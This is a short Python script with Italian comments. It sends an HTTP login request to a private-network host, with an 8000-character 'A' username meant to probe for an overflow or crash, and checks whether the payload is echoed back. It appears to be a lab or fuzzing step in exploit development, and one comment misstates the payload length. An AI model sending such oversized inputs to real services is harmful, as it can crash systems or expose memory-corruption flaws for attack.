#!/usr/bin/env python3

import socket
import urllib.parse

TARGET_IP = "192.168.1.111"
TARGET_PORT = 8080

# Payload da scaricare - 8000 "A"
payload = "A" * 8000

# Username e password per il login
username = payload  # "AAAA..." (3000 bytes)
password = "pass"

# Creare i parametri per POST
login_params = urllib.parse.urlencode({"username": username, "password": password})

request = (
    f"POST /login HTTP/1.1\r\n"
    f"Host: {TARGET_IP}:{TARGET_PORT}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(login_params)}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
    f"{login_params}"
)

with socket.create_connection((TARGET_IP, TARGET_PORT)) as s:
    
    print(f"[+] Connessione a {TARGET_IP}:{TARGET_PORT}")
    
    # Invio richiesta HTTP POST
    print(f"[+] Invio richiesta HTTP POST per login")
    print(f"[+] Payload username: {len(username)} bytes")
    s.sendall(request.encode())
    
    # Ricezione risposta
    response = s.recv(4096)
    print("[+] Risposta HTTP:")
    print(response.decode(errors="ignore"))
    
    # Se la risposta contiene il payload, lo estraiamo
    if payload in response.decode(errors="ignore"):
        print(f"[+] Payload trovato nella risposta: {len(payload)} bytes")
    else:
        print("[!] Payload non trovato nella risposta")
